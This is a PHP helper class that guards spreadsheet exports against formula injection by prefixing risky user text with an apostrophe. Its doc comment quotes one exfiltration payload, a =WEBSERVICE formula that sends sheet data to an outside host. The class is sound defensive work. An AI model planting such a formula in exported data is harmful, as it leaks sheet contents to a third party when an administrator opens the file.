<?php

declare(strict_types=1);

namespace App\Support;

/**
 * Guards text cells before they reach a spreadsheet file.
 *
 * Excel, LibreOffice and Google Sheets evaluate a cell whose value starts with
 * `=`, `+`, `-` or `@` as a formula, so a ticket title like
 * `=WEBSERVICE("http://host/"&M2)` exfiltrates the rest of the sheet as soon as
 * an admin opens the export. Numbers are left untouched because a negative
 * amount legitimately starts with `-`.
 */
final class SpreadsheetCell
{
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r", "\n"];

    /**
     * Prefixes user-entered text with `'` so spreadsheet software keeps it literal.
     */
    public static function guard(?string $value): string
    {
        $value = (string) $value;

        foreach (self::DANGEROUS_PREFIXES as $prefix) {
            if (str_starts_with(ltrim($value), $prefix)) {
                return "'".$value;
            }
        }

        return $value;
    }
}
